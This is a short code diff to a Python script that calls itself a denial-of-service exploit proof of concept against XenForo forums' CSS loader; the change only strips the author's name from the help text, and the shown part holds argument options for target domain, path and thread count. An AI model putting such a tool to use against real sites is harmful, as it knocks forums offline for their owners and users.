@@ -111,7 +111,7 @@ class SendPOSTThread(threading.Thread):
 # check if the site stop responding and alert
 
 def main(argv):
-	parser = argparse.ArgumentParser(description='XenForo CSS Load DoS Exploit PoC. By LockedByte \n Common Usage: python poc.py -u domain.com -c /css.php -t 500')
+	parser = argparse.ArgumentParser(description='XenForo CSS Load DoS Exploit PoC. \n Common Usage: python poc.py -u domain.com -c /css.php -t 500')
 	parser.add_argument('-u', help='Target Domain. Usage: -u \'<domain>\'')
 	parser.add_argument('-c', help='CSS Loader (/css.php) Path. Usage: -c \'<path>\'')
 	parser.add_argument('-p', help='Use this only if the PHP file use POST Requests. PHP POST URL. Usage: -p \'<url>\'')
